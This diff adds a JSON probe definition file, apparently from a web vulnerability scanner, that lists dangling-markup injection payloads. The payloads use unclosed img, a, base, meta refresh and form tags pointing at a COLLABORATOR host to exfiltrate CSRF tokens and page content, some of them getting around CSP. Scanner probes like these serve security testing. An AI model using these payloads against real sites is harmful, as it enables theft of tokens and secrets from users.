@@ -1,0 +1,61 @@
+{
+  "category": "dangling_markup",
+  "contexts": {
+    "token_theft": {
+      "description": "Dangling markup injection to steal CSRF tokens and secrets -- inject unclosed HTML tags that capture page content up to the next matching quote/delimiter",
+      "tech_match": [],
+      "param_match": ["name", "value", "title", "alt", "src", "href", "action", "class", "id", "style", "data", "content", "q", "search", "input"],
+      "probes": [
+        {
+          "payload": "<img src='http://COLLABORATOR/dangling-{{marker}}?steal=",
+          "description": "Dangling img src with open quote -- unclosed quote captures all page content until next single quote (CSRF tokens, API keys) and sends to Collaborator",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "<img src=\"http://COLLABORATOR/dangling-{{marker}}?steal=",
+          "description": "Dangling img src with double quote -- captures content until next double quote in page source",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "<a href='http://COLLABORATOR/dangling-{{marker}}?",
+          "description": "Dangling anchor tag -- captures subsequent page content as URL parameters when user clicks any link",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "<base href='http://COLLABORATOR/dangling-{{marker}}/",
+          "description": "Dangling base tag -- redirects all relative URLs on page to attacker server, capturing form submissions and resource loads",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "csp_bypass_dangling": {
+      "description": "Dangling markup under CSP -- steal data without script execution by using non-script HTML elements to exfiltrate content",
+      "tech_match": [],
+      "param_match": ["name", "value", "title", "alt", "src", "content", "q", "search"],
+      "probes": [
+        {
+          "payload": "<meta http-equiv='refresh' content='0;url=http://COLLABORATOR/meta-{{marker}}?steal=",
+          "description": "Dangling meta refresh -- redirect with open URL captures page content as query string, bypasses script-src CSP",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "<form action='http://COLLABORATOR/form-{{marker}}'><button>Click</button>",
+          "description": "Dangling form injection -- captures input values when user submits, works under strict CSP",
+          "matchers": [{"type": "collaborator", "protocol": "http"}],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
